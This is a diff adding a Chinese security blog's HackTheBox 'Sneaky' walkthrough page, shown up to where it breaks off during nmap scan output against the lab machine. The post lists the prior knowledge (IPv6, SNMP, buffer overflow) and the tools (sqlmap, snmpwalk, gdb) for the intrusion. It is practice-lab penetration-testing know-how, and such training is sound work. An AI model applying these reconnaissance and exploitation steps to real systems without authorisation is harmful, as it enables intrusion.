@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          HTB::Sneaky Walkthrough - ca01h&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+	
+<link rel="stylesheet" href="/css/fontawesome/all.css">
+
+	
+<script src="/js/fontawesome/all.js"></script>
+
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="ca01h's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>CA01H&#39;S BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <h1 id="文章归档"><a href="/archives/index.html"><strong>文章归档</strong></a></h1>
+<h1 id="置顶文章"><strong>置顶文章</strong></h1>
+<ul>
+<li><a href="/Other/6.Linux-Enumeration">Linux Enumeration</a></li>
+</ul>
+<h1 id="Web安全"><strong>Web安全</strong></h1>
+<h2 id="Web安全基础">Web安全基础</h2>
+<ul>
+<li><a href="/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP">在Ubuntu18.04安装LNMP</a></li>
+<li><a href="/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">MySQL数据库基本操作</a></li>
+<li><a href="/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">MySQL的系统表、文件读写</a></li>
+<li><a href="/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0">数据库系统功能相关学习</a></li>
+<li><a href="/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0">数据库注入语句的收集和学习</a></li>
+<li><a href="/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0">Web页面解析的流程学习</a></li>
+<li><a href="/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99">各种注入类型的环境搭建和代码编写</a></li>
+<li><a href="/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge">Sqli-labs手工注入(一)</a></li>
+<li><a href="/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections">Sqli-labs手工注入(二)</a></li>
+<li><a href="/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0">SQLMap入门学习</a></li>
+<li><a href="/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">SQL注入——双查询注入</a></li>
+<li><a href="/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0">XSS漏洞实战学习</a></li>
+<li><a href="/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件包含漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">变量覆盖漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件上传漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">SSRF漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">命令执行漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">逻辑漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">XXE漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">NoSQL注入之MongoDB</a></li>
+<li><a href="/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95">SQL注入专项之MySQL基本注入语法</a></li>
+<li><a href="/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">浅谈LDAP注入攻击</a></li>
+</ul>
+<h2 id="PHP相关">PHP相关</h2>
+<ul>
+<li><a href="/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">PHP回调后门</a></li>
+<li><a href="/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87">PHP反序列化——基础篇</a></li>
+<li><a href="/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Phar</a></li>
+<li><a href="/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Session</a></li>
+<li><a href="/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">PHP反序列化-原生类利用</a></li>
+<li><a href="/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell">PHP无数字字母构造webshell</a></li>
+<li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHP无参数函数的利用</a></li>
+<li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLF利用</a></li>
+<li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li>
+</ul>
+<h2 id="Writeups">Writeups</h2>
+<ul>
+<li><a href="/Web_security/ctf_writeup/3.CGCTF-Writeup">CGCTF-Writeup</a></li>
+<li><a href="/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">BUUCTF—PHP代审</a></li>
+<li><a href="/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87">BUUCTF—PHP框架漏洞</a></li>
+<li><a href="/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">BUUCTF—PHP反序列化</a></li>
+<li><a href="/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5">BUUCTF—SQL注入</a></li>
+<li><a href="/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS">BUUCTF—XSS</a></li>
+<li><a href="/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF">BUUCTF—SSRF</a></li>
+<li><a href="/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">BUUCTF—命令执行</a></li>
+<li><a href="/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">BUUCTF—文件上传</a></li>
+<li><a href="/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">BUUCTF—文件包含</a></li>
+<li><a href="/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python">BUUCTF—Python</a></li>
+<li><a href="/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS">BUUCTF—NodeJS</a></li>
+<li><a href="/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo">BUUCTF—Ruby和Go</a></li>
+<li><a href="/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87">BUUCTF—渗透测试</a></li>
+<li><a href="/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest">2020电信天翼杯CTF—APITest</a></li>
+<li><a href="/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn">星盟6月AWD Web+Pwn</a></li>
+<li><a href="/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B">DASCTF2020七月赛 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/20.CSICTF2020">CSICTF2020 Web+Linux</a></li>
+<li><a href="/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web">2020第五空间CTF Web</a></li>
+<li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">首届钓鱼城杯CTF</a></li>
+<li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTF八月赛</a></li>
+</ul>
+<h1 id="靶机系列"><strong>靶机系列</strong></h1>
+<h2 id="HackTheBox">HackTheBox</h2>
+<ul>
+<li><a href="/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough">HTB::OpenAdmin</a></li>
+<li><a href="/Target_drone/HackTheBox/2.HTB-Postman-walkthrough">HTB::Postman</a></li>
+<li><a href="/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough">HTB::Traverxec</a></li>
+<li><a href="/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough">HTB::Obscurity</a></li>
+<li><a href="/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough">HTB::Mongo</a></li>
+<li><a href="/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough">HTB::Tenten</a></li>
+<li><a href="/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough">HTB::Sneaky</a></li>
+<li><a href="/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough">HTB::Teacher</a></li>
+<li><a href="/Target_drone/HackTheBox/9.HTB-Irked-walkthrough">HTB::Irked</a></li>
+<li><a href="/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough">HTB::Traceback</a></li>
+<li><a href="/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough">HTB::DevOops</a></li>
+<li><a href="/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough">HTB::Blocky</a></li>
+<li><a href="/Target_drone/HackTheBox/13.HTB-Beep-walkthrough">HTB::Beep</a></li>
+<li><a href="/Target_drone/HackTheBox/14.HTB-Book-walkthrough">HTB::Book</a></li>
+<li><a href="/Target_drone/HackTheBox/16.HTB-Craft-walkthrough">HTB::Craft</a></li>
+<li><a href="/Target_drone/HackTheBox/17.HTB-CTF-walkthrough">HTB::CTF</a></li>
+<li><a href="/Target_drone/HackTheBox/15.HTB-Magic-walkthrough">HTB::Magic</a></li>
+</ul>
+<h2 id="VulnHub">VulnHub</h2>
+<ul>
+<li><a href="/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough">VulnHub::BossplayersCTF</a></li>
+<li><a href="/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough">VulnHub::DC-1</a></li>
+<li><a href="/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough">VulnHub::DigitalWorld:JOY</a></li>
+</ul>
+<h1 id="代码审计"><strong>代码审计</strong></h1>
+<h2 id="PHP代码审计">PHP代码审计</h2>
+<ul>
+<li><a href="/code_audit/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1">PHP代码审计学习—Day1</a></li>
+<li><a href="/code_audit/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2">PHP代码审计学习—Day2</a></li>
+<li><a href="/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3">PHP代码审计学习—Day3</a></li>
+<li><a href="/code_audit/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4">PHP代码审计学习—Day4</a></li>
+<li><a href="/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHP代码审计学习—Day5</a></li>
+<li><a href="/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHP代码审计复现—yixuncms</a></li>
+<li><a href="/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHP代码审计复现—chinaz</a></li>
+</ul>
+<h1 id="流量分析"><strong>流量分析</strong></h1>
+<ul>
+<li><a href="/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1">Datacon2019-q1-wp-v1</a></li>
+<li><a href="/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2">Datacon2019-q1-wp-v2</a></li>
+<li><a href="/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Bro语法学习之基础知识</a></li>
+</ul>
+<h1 id="机器学习"><strong>机器学习</strong></h1>
+<h2 id="基础学习">基础学习</h2>
+<ul>
+<li><a href="/Machine_learning/basic_learning/1.Machine-Learning-Week1">Machine-Learning-Week1</a></li>
+<li><a href="/Machine_learning/basic_learning/2.Machine-Learning-Week2">Machine-Learning-Week2</a></li>
+<li><a href="/Machine_learning/basic_learning/3.Machine-Learning-Week3">Machine-Learning-Week3</a></li>
+<li><a href="/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89">机器学习与网络安全相关的资料（转）</a></li>
+</ul>
+<h1 id="Python"><strong>Python</strong></h1>
+<h2 id="Python编程">Python编程</h2>
+<ul>
+<li>
+<p><a href="/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0">Python函数的参数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0">Python函数式编程之高阶函数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85">Python函数式编程-闭包</a></p>
+</li>
+<li>
+<p><a href="/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8">Python函数式编程-装饰器</a></p>
+</li>
+<li>
+<p><a href="/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF">Python面向对象高级编程之slots、@property和多重继承</a></p>
+</li>
+<li>
+<p><a href="/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B">PythonIO编程</a></p>
+</li>
+</ul>
+<h1 id="Java"><strong>Java</strong></h1>
+<h2 id="Java编程">Java编程</h2>
+<ul>
+<li><a href="/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM">Java基础学习之JDK、JRE、JVM</a></li>
+<li><a href="/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB">Java基础学习之核心类</a></li>
+<li><a href="/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">Java基础学习之面向对象基础</a></li>
+<li><a href="/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">Java基础学习之异常处理</a></li>
+</ul>
+<h1 id="算法"><strong>算法</strong></h1>
+<h2 id="Leetcode">Leetcode</h2>
+<ul>
+<li><a href="/Algorithm/1.Leetcode-Primary-class">Leetcode-Primary-class</a></li>
+</ul>
+<h1 id="随笔"><strong>随笔</strong></h1>
+<h2 id="经验">经验</h2>
+<ul>
+<li><a href="/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9">从0到100分的路程——写在2019年的最后一天</a></li>
+</ul>
+<h2 id="技术">技术</h2>
+<ul>
+<li><a href="/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo">阿里云Centos7-Ngnix部署Hexo</a></li>
+<li><a href="/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A">阿里云OSS-PicGo搭建Markdown图床</a></li>
+<li><a href="/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">Hexo渲染LaTeX数学公式</a></li>
+<li><a href="/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">Git CheatSheet</a></li>
+<li><a href="/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95">Tmux CheatSheet</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="book-post">
+  
+  <i class="fas fa-calendar-day"></i>&nbsp;2020-03-21&nbsp;
+  <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span><span> times</span>&nbsp;
+  <i class="fas fa-file-word"></i>&nbsp;<span class="post-count">3.1k</span>
+  
+  <blockquote>
+<p>不得不说这个靶机的质量非常高，值得一做。（假装安慰一下自己vip没有白充）</p>
+</blockquote>
+<h1 id="HTB-Sneaky-Walkthrough">HTB::Sneaky Walkthrough</h1>
+<h2 id="0x01-Info-Card">0x01 Info Card</h2>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200319101112.png" alt=""></p>
+<h3 id="0x02-Prior-knowledge">0x02 Prior knowledge</h3>
+<h3 id="IPv6">IPv6</h3>
+<p><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/ipv6/ipv6_address_types.html">https://www.w3cschool.cn/ipv6/ipv6_address_types.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.what21.com/sys/view/net_ipv6_1536653956137.html">http://www.what21.com/sys/view/net_ipv6_1536653956137.html</a></p>
+<p>主要搞清楚IPv6的地址类型和格式，以及本机Mac地址转换成本地唯一地址的计算方法</p>
+<h3 id="SNMP">SNMP</h3>
+<p><a target="_blank" rel="noopener" href="https://www.manageengine.com/network-monitoring/what-is-snmp.html">https://www.manageengine.com/network-monitoring/what-is-snmp.html</a></p>
+<p>对于SNMP协议，主要是了解它的管理信息库(MIB，Management Information Base)和对象标识符(OID，Object ID)概念。管理信息库（MIB）是用于管理网络元素的信息的集合， 由对象标识符（OID）标识的管理对象组成了下面这种树状结构：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200321120643.png" alt=""></p>
+<h3 id="Buffer-overflow">Buffer overflow</h3>
+<h2 id="0x03-Tools-and-Tips">0x03 Tools and Tips</h2>
+<ul>
+<li>nmap</li>
+<li>sqlmap</li>
+<li>snmpwalk OR snmp-check</li>
+<li>gdb</li>
+<li>Basic SQL Injection</li>
+<li>Enumerating SNMP</li>
+<li>Basic buffer overflow exploitation</li>
+</ul>
+<h2 id="0x04-Pentesting">0x04 Pentesting</h2>
+<p>nmap扫描靶机端口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.10.20</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Under Development!</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; ).</span><br><span class="line">TCP&#x2F;IP fingerprint:</span><br><span class="line">OS:SCAN(V&#x3D;7.80%E&#x3D;4%D&#x3D;3&#x2F;19%OT&#x3D;80%CT&#x3D;1%CU&#x3D;37304%PV&#x3D;Y%DS&#x3D;2%DC&#x3D;T%G&#x3D;Y%TM&#x3D;5E72D70</span><br><span class="line">OS:C%P&#x3D;i686-pc-windows-windows)SEQ(SP&#x3D;107%GCD&#x3D;1%ISR&#x3D;10D%TI&#x3D;Z%CI&#x3D;I%II&#x3D;I%TS&#x3D;8</span><br><span class="line">OS:)SEQ(CI&#x3D;I%II&#x3D;I)OPS(O1&#x3D;M54BST11NW7%O2&#x3D;M54BST11NW7%O3&#x3D;M54BNNT11NW7%O4&#x3D;M54B</span><br><span class="line">OS:ST11NW7%O5&#x3D;M54BST11NW7%O6&#x3D;M54BST11)WIN(W1&#x3D;7120%W2&#x3D;7120%W3&#x3D;7120%W4&#x3D;7120%W</span><br><span class="line">OS:5&#x3D;7120%W6&#x3D;7120)ECN(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;7210%O&#x3D;M54BNNSNW7%CC&#x3D;Y%Q&#x3D;)T1(R&#x3D;Y%DF&#x3D;Y</span><br><span class="line">OS:%T&#x3D;40%S&#x3D;O%A&#x3D;S+%F&#x3D;AS%RD&#x3D;0%Q&#x3D;)T2(R&#x3D;N)T3(R&#x3D;N)T4(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%F</span><br><span class="line">OS:&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T5(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RD&#x3D;0%Q&#x3D;)T6(R&#x3D;Y%DF&#x3D;Y%</span><br><span 